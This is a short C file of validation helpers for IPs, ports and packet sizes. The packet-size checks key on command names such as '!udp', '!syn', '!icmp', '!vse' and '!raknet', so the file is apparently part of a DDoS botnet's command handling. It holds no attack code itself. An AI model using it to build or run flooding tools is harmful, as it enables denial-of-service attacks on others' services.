#include "headers/checks.h"
#include <arpa/inet.h>
#include <string.h>
#include <ctype.h>

int validate_ip(const char *ip) {
    if (!ip) return 0;
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr));
}

int validate_port(int port) {
    return port > 0 && port <= 65535;
}

int validate_psize(int psize, const char *cmd) {
    if (psize <= 0) return 0;
    if (strncmp(cmd, "!vse", 4) == 0 && psize > 1492) return 0;
    if (strncmp(cmd, "!raknet", 7) == 0 && psize > 1492) return 0;
    if ((strncmp(cmd, "!udp", 4) == 0 || strncmp(cmd, "!syn", 4) == 0 || strncmp(cmd, "!icmp", 5) == 0) && psize > 64500) return 0;
    return 1;
}

int validate_srcport(int srcport) {
    return srcport > 0 && srcport <= 65535;
}

int is_valid_int(const char *str) {
    if (!str || !*str) return 0;
    for (int i = 0; str[i]; i++) {
        if (!isdigit((unsigned char)str[i])) return 0;
    }
    return 1;
}